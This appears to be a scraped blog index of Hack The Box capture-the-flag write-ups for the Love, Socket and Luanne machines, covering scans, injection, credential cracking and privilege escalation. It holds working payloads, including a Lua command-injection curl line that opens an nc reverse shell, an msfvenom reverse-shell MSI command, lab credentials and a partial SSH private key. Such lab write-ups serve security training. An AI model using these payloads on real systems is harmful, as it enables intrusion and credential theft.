[+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/08 17:32:46 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 338] [--\u0026gt; http://10.10.10.239/images/] /index.php (Status: 200) [Size: 4388] /home.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /login.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /Images (Status: 301) [Size: 338] [--\u0026gt; http://10.10.10.239/Images/] /admin (Status: 301) [Size: 337] [--\u0026gt; http://10.10.10.239/admin/] /Home.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /plugins (Status: 301) [Size: 339] [--\u0026gt; http://10.10.10.239/plugins/] /includes (Status: 301) [Size: 340] [--\u0026gt; http://10.10.10.239/includes/] /Index.php (Status: 200) [Size: 4388] /Login.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /examples (Status: 503) [Size: 402] /logout.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /preview.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /dist (Status: 301) [Size: 336] [--\u0026gt; http://10.10.10.239/dist/] /licenses (Status: 403) [Size: 421] /IMAGES (Status: 301) [Size: 338] [--\u0026gt; http://10.10.10.239/IMAGES/] /%20 (Status: 403) [Size: 302] /INDEX.php (Status: 200) [Size: 4388] /Admin (Status: 301) [Size: 337] [--\u0026gt; http://10.10.10.239/Admin/] /*checkout*.php (Status: 403) [Size: 302] /*checkout* (Status: 403) [Size: 302] /*checkout*.txt (Status: 403) [Size: 302] /Plugins (Status: 301) [Size: 339] [--\u0026gt; http://10.10.10.239/Plugins/] /phpmyadmin (Status: 403) [Size: 302] /HOME.php (Status: 302) [Size: 0] [--\u0026gt; index.php] searchsploit But we don\u0026rsquo;t know the version Also, I didn\u0026rsquo;t noticed first, but there is a vhost staging.love.htb It\u0026rsquo;s a free file scanner application Foothold/User We have a /demo.php where we can supply url If we try supplying our ip, we have a connection Potential SSRF Same with http://10.10.10.239 We had port 5000, let\u0026rsquo;s try supplying We have creds from Password Dashboard admin:@LoveIsInTheAir!!!! We have a possible RCE candidate Let\u0026rsquo;s run it If we use the exploit 49445.py from searchsploit, don\u0026rsquo;t forget to remove votingsystem from urls in script since our target doesn\u0026rsquo;t have that route Set your listener and execute the exploit Root Winpeas shows possible priv esc path with AlwaysInstallElevated Let\u0026rsquo;s create malicious msi and run it msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.3 LPORT=6666 -f msi -o revshell.msi Download file Launch listener and run malicious file msiexec /quiet /qn /i revshell.msi ","date":"August 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/love/images/love.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/love/","summary":"Love Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.239 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-08 16:58 BST Nmap scan report for 10.10.10.239 (10.10.10.239) Host is up (0.19s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) |_http-title: Voting System using PHP | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.","tags":["HTB","ssrf","upload","webshell","winpeas","alwaysinstallelevated","msi","msfvenom"],"title":"[HTB] Machine: Love"},{"categories":null,"contents":"Socket Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p22,80,5789 -sC -sV 10.10.11.206 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 17:58 BST Nmap scan report for 10.10.11.206 (10.10.11.206) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://qreader.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) 5789/tcp open unknown | fingerprint-strings: | GenericLines, GetRequest: | HTTP/1.1 400 Bad Request | Date: Tue, 23 May 2023 16:58:15 GMT | Server: Python/3.10 websockets/10.4 | Content-Length: 77 | Content-Type: text/plain | Connection: close | Failed to open a WebSocket connection: did not receive a valid HTTP request. | HTTPOptions, RTSPRequest: | HTTP/1.1 400 Bad Request | Date: Tue, 23 May 2023 16:58:16 GMT | Server: Python/3.10 websockets/10.4 | Content-Length: 77 | Content-Type: text/plain | Connection: close | Failed to open a WebSocket connection: did not receive a valid HTTP request. | Help: | HTTP/1.1 400 Bad Request | Date: Tue, 23 May 2023 16:58:32 GMT | Server: Python/3.10 websockets/10.4 | Content-Length: 77 | Content-Type: text/plain | Connection: close | Failed to open a WebSocket connection: did not receive a valid HTTP request. | SSLSessionReq: | HTTP/1.1 400 Bad Request | Date: Tue, 23 May 2023 16:58:33 GMT | Server: Python/3.10 websockets/10.4 | Content-Length: 77 | Content-Type: text/plain | Connection: close |_ Failed to open a WebSocket connection: did not receive a valid HTTP request. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port5789-TCP:V=7.93%I=7%D=5/23%Time=646CF0C0%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x202 SF:3\\x20May\\x202023\\x2016:58:15\\x20GMT\\r\\nServer:\\x20Python/3\\.10\\x20webso SF:ckets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Type:\\x20text/plain\\r\\n SF:Connection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x20a\\x20WebSocket\\x20c SF:onnection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x20HTTP\\x20request\\.\\ SF:n\u0026#34;)%r(GetRequest,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue SF:,\\x2023\\x20May\\x202023\\x2016:58:15\\x20GMT\\r\\nServer:\\x20Python/3\\.10\\x2 SF:0websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Type:\\x20text/pla SF:in\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x20a\\x20WebSocke SF:t\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x20HTTP\\x20requ SF:est\\.\\n\u0026#34;)%r(HTTPOptions,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nDate: SF:\\x20Tue,\\x2023\\x20May\\x202023\\x2016:58:16\\x20GMT\\r\\nServer:\\x20Python/3 SF:\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Type:\\x20t SF:ext/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x20a\\x20W SF:ebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x20HTTP\\ SF:x20request\\.\\n\u0026#34;)%r(RTSPRequest,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r SF:\\nDate:\\x20Tue,\\x2023\\x20May\\x202023\\x2016:58:16\\x20GMT\\r\\nServer:\\x20P SF:ython/3\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Typ SF:e:\\x20text/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x2 SF:0a\\x20WebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x SF:20HTTP\\x20request\\.\\n\u0026#34;)%r(Help,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r SF:\\nDate:\\x20Tue,\\x2023\\x20May\\x202023\\x2016:58:32\\x20GMT\\r\\nServer:\\x20P SF:ython/3\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Typ SF:e:\\x20text/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x2 SF:0a\\x20WebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x SF:20HTTP\\x20request\\.\\n\u0026#34;)%r(SSLSessionReq,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20 SF:Request\\r\\nDate:\\x20Tue,\\x2023\\x20May\\x202023\\x2016:58:33\\x20GMT\\r\\nSer SF:ver:\\x20Python/3\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nCo SF:ntent-Type:\\x20text/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x SF:20open\\x20a\\x20WebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x SF:20valid\\x20HTTP\\x20request\\.\\n\u0026#34;); Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 102.05 seconds gobuster ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://qreader.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://qreader.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/05/23 18:03:37 Starting gobuster in directory enumeration mode =============================================================== /report (Status: 200) [Size: 4161] /embed (Status: 405) [Size: 153] /reader (Status: 405) [Size: 153] /server-status (Status: 403) [Size: 276] Web server There are download links on the website to the app Foothold/User The initial static analysis showed that it was python compiled binary I followed the post And now we have something we can read We see a websocket and hostname We find 2 routes: /update and /version We can also use wireshark and intercept the traffic of the application to confirm the routes So now we can play around with the socket I used web socket browser extension After playing arount with the payload, I found out that it was vulnerable to SQLi I was trying to make it work with sqlmap There is a nice post that can help you achieve this After dumping the database we have: The hash and a user, so we can craft the possible username variants using username-anarchy Let\u0026rsquo;s crack the hash Now we can use crackmapexec to find our creds Login via ssh Root Let\u0026rsquo;s check sudo rights We have rights to execute a script as root We have a pyinstaller According to the docs we need to supply spec file: The spec file is actually executable Pyt+hon code... We can try abusing it by creating spec file with python code and supplying to script Launch a listener and execute the script ","date":"July 15, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/socket/images/socket.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/socket/","summary":"Socket Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p22,80,5789 -sC -sV 10.10.11.206 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 17:58 BST Nmap scan report for 10.10.11.206 (10.10.11.206) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://qreader.","tags":["HTB","qrcode","websocket","username-anarchy","websocket-sqli","pyinstaller","pyinstxtractor","pycdc"],"title":"[HTB] Machine: Socket"},{"categories":null,"contents":"Luanne Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.218 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 17:33 BST Nmap scan report for 10.10.10.218 (10.10.10.218) Host is up (0.15s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0) | ssh-hostkey: | 3072 20977f6c4a6e5d20cffda3aaa90d37db (RSA) | 521 35c329e187706d7374b2a9a204a96669 (ECDSA) |_ 256 b3bd316dcc226b18ed2766b4a72ae4a5 (ED25519) 80/tcp open http nginx 1.19.0 | http-robots.txt: 1 disallowed entry |_/weather |_http-server-header: nginx/1.19.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=. |_http-title: 401 Unauthorized 9001/tcp open http Medusa httpd 1.12 (Supervisor process manager) |_http-title: Error response | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=default |_http-server-header: Medusa/1.12 Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 204.16 seconds Web server Foothold If we visit port 9001, we have login page but it shows nothing else nmap tells us some information about Supervisor process manager and realm Googling reveals the configuration The creds work user:123 We see an interesting process\n/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www -L weather /usr/local/webapi/weather.lua - Adds /usr/local/webapi/weather.lua Lua script for the prefix weather (man page) ... will trigger the execution of the Lua script when a URL in the form http://10.10.10.218/weather/\u0026lt;name\u0026gt; is being accessed Let\u0026rsquo;s check port 80\nWe see port └─$ curl -v http://10.10.10.218 * Trying 10.10.10.218:80... * Connected to 10.10.10.218 (10.10.10.218) port 80 (#0) \u0026gt; GET / HTTP/1.1 \u0026gt; Host: 10.10.10.218 \u0026gt; User-Agent: curl/7.88.1 \u0026gt; Accept: */* \u0026gt; \u0026lt; HTTP/1.1 401 Unauthorized \u0026lt; Server: nginx/1.19.0 \u0026lt; Date: Thu, 20 Jul 2023 18:05:49 GMT \u0026lt; Content-Type: text/html \u0026lt; Content-Length: 209 \u0026lt; Connection: keep-alive \u0026lt; WWW-Authenticate: Basic realm=\u0026#34;.\u0026#34; \u0026lt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;401 Unauthorized\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;401 Unauthorized\u0026lt;/h1\u0026gt; /index.html: \u0026lt;pre\u0026gt;No authorization\u0026lt;/pre\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;address\u0026gt;\u0026lt;a href=\u0026#34;//127.0.0.1:3000/\u0026#34;\u0026gt;127.0.0.1:3000\u0026lt;/a\u0026gt;\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; * Connection #0 to host 10.10.10.218 left intact Let\u0026rsquo;s gobuster weather directory └─$ gobuster dir -u http://10.10.10.218/weather -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.218/weather [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/07/20 19:11:39 Starting gobuster in directory enumeration mode =============================================================== /forecast (Status: 200) [Size: 90] Visit the page The result of visiting ?city=London └─$ curl -s http://10.10.10.218/weather/forecast?city=London | jq { \u0026#34;code\u0026#34;: 200, \u0026#34;city\u0026#34;: \u0026#34;London\u0026#34;, \u0026#34;list\u0026#34;: [ { \u0026#34;date\u0026#34;: \u0026#34;2023-07-20\u0026#34;, \u0026#34;weather\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;snowy\u0026#34;, \u0026#34;temperature\u0026#34;: { \u0026#34;min\u0026#34;: \u0026#34;12\u0026#34;, \u0026#34;max\u0026#34;: \u0026#34;46\u0026#34; }, \u0026#34;pressure\u0026#34;: \u0026#34;1799\u0026#34;, \u0026#34;humidity\u0026#34;: \u0026#34;92\u0026#34;, \u0026#34;wind\u0026#34;: { \u0026#34;speed\u0026#34;: \u0026#34;2.1975513692014\u0026#34;, \u0026#34;degree\u0026#34;: \u0026#34;102.76822959445\u0026#34; } } }, { \u0026#34;date\u0026#34;: \u0026#34;2023-07-21\u0026#34;, \u0026#34;weather\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;partially cloudy\u0026#34;, \u0026#34;temperature\u0026#34;: { \u0026#34;min\u0026#34;: \u0026#34;15\u0026#34;, \u0026#34;max\u0026#34;: \u0026#34;43\u0026#34; }, \u0026#34;pressure\u0026#34;: \u0026#34;1365\u0026#34;, \u0026#34;humidity\u0026#34;: \u0026#34;51\u0026#34;, \u0026#34;wind\u0026#34;: { \u0026#34;speed\u0026#34;: \u0026#34;4.9522297247313\u0026#34;, \u0026#34;degree\u0026#34;: \u0026#34;262.63571172766\u0026#34; } } }, { \u0026#34;date\u0026#34;: \u0026#34;2023-07-22\u0026#34;, \u0026#34;weather\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;sunny\u0026#34;, \u0026#34;temperature\u0026#34;: { \u0026#34;min\u0026#34;: \u0026#34;19\u0026#34;, \u0026#34;max\u0026#34;: \u0026#34;30\u0026#34; }, \u0026#34;pressure\u0026#34;: \u0026#34;1243\u0026#34;, \u0026#34;humidity\u0026#34;: \u0026#34;13\u0026#34;, \u0026#34;wind\u0026#34;: { \u0026#34;speed\u0026#34;: \u0026#34;1.8041767538525\u0026#34;, \u0026#34;degree\u0026#34;: \u0026#34;48.400944394059\u0026#34; } } }, { \u0026#34;date\u0026#34;: \u0026#34;2023-07-23\u0026#34;, \u0026#34;weather\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;sunny\u0026#34;, \u0026#34;temperature\u0026#34;: { \u0026#34;min\u0026#34;: \u0026#34;30\u0026#34;, \u0026#34;max\u0026#34;: \u0026#34;34\u0026#34; }, \u0026#34;pressure\u0026#34;: \u0026#34;1513\u0026#34;, \u0026#34;humidity\u0026#34;: \u0026#34;84\u0026#34;, \u0026#34;wind\u0026#34;: { \u0026#34;speed\u0026#34;: \u0026#34;2.6126398323104\u0026#34;, \u0026#34;degree\u0026#34;: \u0026#34;191.63755226741\u0026#34; } } }, { \u0026#34;date\u0026#34;: \u0026#34;2023-07-24\u0026#34;, \u0026#34;weather\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;partially cloudy\u0026#34;, \u0026#34;temperature\u0026#34;: { \u0026#34;min\u0026#34;: \u0026#34;30\u0026#34;, \u0026#34;max\u0026#34;: \u0026#34;36\u0026#34; }, \u0026#34;pressure\u0026#34;: \u0026#34;1772\u0026#34;, \u0026#34;humidity\u0026#34;: \u0026#34;53\u0026#34;, \u0026#34;wind\u0026#34;: { \u0026#34;speed\u0026#34;: \u0026#34;2.7699138359167\u0026#34;, \u0026#34;degree\u0026#34;: \u0026#34;104.89152945159\u0026#34; } } } ] } If we visit the city that is not in the list, we get an error └─$ curl -s http://10.10.10.218/weather/forecast?city=Moscow | jq { \u0026#34;code\u0026#34;: 500, \u0026#34;error\u0026#34;: \u0026#34;unknown city: Moscow\u0026#34; } There is a post regarding lua vulnerabilities If we fuzz for special chars with ffuf we find 2 cases there request breaks └─$ ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u http://10.10.10.218/weather/forecast?city=FUZZ -mc 500 -fw 5 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.10.218/weather/forecast?city=FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/special-chars.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 500 :: Filter : Response words: 5 ________________________________________________ [Status: 500, Size: 40, Words: 6, Lines: 1, Duration: 183ms] * FUZZ: + [Status: 500, Size: 77, Words: 9, Lines: 2, Duration: 109ms] * FUZZ: \u0026#39; :: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 :: If we try ', we see an error └─$ curl \u0026#34;http://10.10.10.218/weather/forecast?city=\u0026#39;\u0026#34; \u0026lt;br\u0026gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value If we search fuzz ' with different combinations of chars, we have nothing But if we add -- which specifies the comment block in lua, we have the same error So we start fuzzing the following combination 'FUZZ-- to find something └─$ curl \u0026#34;http://10.10.10.218/weather/forecast?city=\u0026#39;--\u0026#34; \u0026lt;br\u0026gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value └─$ ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u \u0026#34;http://10.10.10.218/weather/forecast?city=\u0026#39;FUZZ--\u0026#34; -mc 200,500 -fw 9 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.10.218/weather/forecast?city=\u0026#39;FUZZ-- :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/special-chars.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,500 :: Filter : Response words: 9 ________________________________________________ [Status: 500, Size: 37, Words: 5, Lines: 1, Duration: 106ms] * FUZZ: ) :: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 :: And now we have the following output └─$ curl \u0026#34;http://10.10.10.218/weather/forecast?city=\u0026#39;)--\u0026#34; {\u0026#34;code\u0026#34;: 500,\u0026#34;error\u0026#34;: \u0026#34;unknown city: Let\u0026rsquo;s try a command injection And it works └─$ curl \u0026#34;http://10.10.10.218/weather/forecast?city=\u0026#39;)os.execute(\u0026#39;id\u0026#39;)--\u0026#34; {\u0026#34;code\u0026#34;: 500,\u0026#34;error\u0026#34;: \u0026#34;unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd) Let\u0026rsquo;s get reverse shell curl \u0026quot;http://10.10.10.218/weather/forecast?city=')os.execute('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.12%206666%20%3E%2Ftmp%2Ff')--\u0026quot; User Let\u0026rsquo;s enumerate We have a .htpasswd hashcat -m 500 hash /usr/share/wordlists/rockyou.txt $1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest But we can do nothing with the password /etc/passwd Another user r.michaels root:*:0:0:Charlie \u0026amp;:/root:/bin/sh toor:*:0:0:Bourne-again Superuser:/root:/bin/sh daemon:*:1:1:The devil himself:/:/sbin/nologin operator:*:2:5:System \u0026amp;:/usr/guest/operator:/sbin/nologin bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin games:*:7:13:\u0026amp; pseudo-user:/usr/games:/sbin/nologin postfix:*:12:12:\u0026amp; pseudo-user:/var/spool/postfix:/sbin/nologin named:*:14:14:\u0026amp; pseudo-user:/var/chroot/named:/sbin/nologin ntpd:*:15:15:\u0026amp; pseudo-user:/var/chroot/ntpd:/sbin/nologin sshd:*:16:16:\u0026amp; pseudo-user:/var/chroot/sshd:/sbin/nologin _pflogd:*:18:18:\u0026amp; pseudo-user:/var/chroot/pflogd:/sbin/nologin _rwhod:*:19:19:\u0026amp; pseudo-user:/var/rwho:/sbin/nologin _proxy:*:21:21:Proxy Services:/nonexistent:/sbin/nologin _timedc:*:22:22:\u0026amp; pseudo-user:/nonexistent:/sbin/nologin _sdpd:*:23:23:\u0026amp; pseudo-user:/nonexistent:/sbin/nologin _httpd:*:24:24:\u0026amp; pseudo-user:/var/www:/sbin/nologin _mdnsd:*:25:25:\u0026amp; pseudo-user:/nonexistent:/sbin/nologin _tests:*:26:26:\u0026amp; pseudo-user:/nonexistent:/sbin/nologin _tcpdump:*:27:27:\u0026amp; pseudo-user:/var/chroot/tcpdump:/sbin/nologin _tss:*:28:28:\u0026amp; pseudo-user:/var/tpm:/sbin/nologin _rtadvd:*:30:30:\u0026amp; pseudo-user:/var/chroot/rtadvd:/sbin/nologin _unbound:*:32:32:\u0026amp; pseudo-user:/var/chroot/unbound:/sbin/nologin _nsd:*:33:33:\u0026amp; pseudo-user:/var/chroot/nsd:/sbin/nologin uucp:*:66:1:UNIX-to-UNIX Copy:/nonexistent:/sbin/nologin nobody:*:32767:39:Unprivileged user:/nonexistent:/sbin/nologin r.michaels:*:1000:100::/home/r.michaels:/bin/ksh nginx:*:1001:1000:NGINX server user:/var/db/nginx:/sbin/nologin dbus:*:1002:1001:System message bus:/var/run/dbus:/sbin/nologin Processes launched by r.michaels $ ps auxw | grep michaels r.michaels 185 0.0 0.0 36460 1972 ? Is 4:38PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home We have identical application with a flags -u and -X (Enables directory indexing) Enables the transformation of Uniform Resource Locators of the form /~user/ into the directory ~user/public_html Which means we can access user directory If try it, we have no access $ curl -s http://127.0.0.1:3001/~r.michaels/ \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;401 Unauthorized\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;401 Unauthorized\u0026lt;/h1\u0026gt; ~r.michaels//: \u0026lt;pre\u0026gt;No authorization\u0026lt;/pre\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;address\u0026gt;\u0026lt;a href=\u0026#34;//127.0.0.1:3001/\u0026#34;\u0026gt;127.0.0.1:3001\u0026lt;/a\u0026gt;\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; But if use the creds from .htpasswd, they work $ curl -s http://127.0.0.1:3001/~r.michaels/ -u webapi_user:iamthebest \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta charset=\u0026#34;utf-8\u0026#34;/\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; table { border-top: 1px solid black; border-bottom: 1px solid black; } th { background: aquamarine; } tr:nth-child(even) { background: lavender; } \u0026lt;/style\u0026gt; \u0026lt;title\u0026gt;Index of ~r.michaels/\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;Index of ~r.michaels/\u0026lt;/h1\u0026gt; \u0026lt;table cols=3\u0026gt; \u0026lt;thead\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;th\u0026gt;Last modified\u0026lt;th align=right\u0026gt;Size \u0026lt;tbody\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;../\u0026#34;\u0026gt;Parent Directory\u0026lt;/a\u0026gt;\u0026lt;td\u0026gt;16-Sep-2020 18:20\u0026lt;td align=right\u0026gt;1kB \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;id_rsa\u0026#34;\u0026gt;id_rsa\u0026lt;/a\u0026gt;\u0026lt;td\u0026gt;16-Sep-2020 16:52\u0026lt;td align=right\u0026gt;3kB \u0026lt;/table\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; We see a private key $ curl -s http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user:iamthebest -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAvXxJBbm4VKcT2HABKV2Kzh9GcatzEJRyvv4AAalt349ncfDkMfFB Icxo9PpLUYzecwdU3LqJlzjFga3kG7VdSEWm+C1fiI4LRwv/iRKyPPvFGTVWvxDXFTKWXh 0DpaB9XVjggYHMr0dbYcSF2V5GMfIyxHQ8vGAE+QeW9I0Z2nl54ar/I/j7c87SY59uRnHQ kzRXevtPSUXxytfuHYr1Ie1YpGpdKqYrYjevaQR5CAFdXPobMSxpNxFnPyyTFhAbzQuchD ryXEuMkQOxsqeavnzonomJSuJMIh4ym7NkfQ3eKaPdwbwpiLMZoNReUkBqvsvSBpANVuyK BNUj4JWjBpo85lrGqB+NG2MuySTtfS8lXwDvNtk/DB3ZSg5OFoL0LKZeCeaE6vXQR5h9t8 3CEdSO8yVrcYMPlzVRBcHp00DdLk4cCtqj+diZmR8MrXokSR8y5XqD3/IdH5+zj1BTHZXE pXXqVFFB7Jae+LtuZ3XTESrVnpvBY48YRkQXAmMVAAAFkBjYH6gY2B+oAAAAB3NzaC1yc2 